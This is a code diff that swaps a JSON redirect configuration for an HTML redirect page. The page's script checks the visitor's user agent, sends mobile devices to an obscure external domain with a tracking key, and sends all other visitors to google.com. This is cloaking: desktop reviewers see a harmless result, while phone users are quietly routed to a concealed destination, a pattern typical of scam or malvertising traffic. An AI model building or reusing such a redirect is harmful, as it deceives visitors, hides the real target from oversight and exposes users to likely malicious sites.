@@ -1,9 +1,27 @@
-{
-  "redirects": [
-    {
-      "source": "/",
-      "destination": "https://t.co/qgtxlRN3y6",
-      "permanent": false
-    }
-  ]
-}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Redirecting...</title>
+
+    <script>
+        (function () {
+            const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+
+            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
+
+            if (isMobile) {
+                window.location.replace("https://falconhoe.com/zcvm0rch?key=93b158ea491b4f11e0adbacd15934c67");
+            } else {
+                window.location.replace("https://www.google.com");
+            }
+        })();
+    </script>
+</head>
+
+<body>
+    <p>Redirecting...</p>
+</body>
+</html>
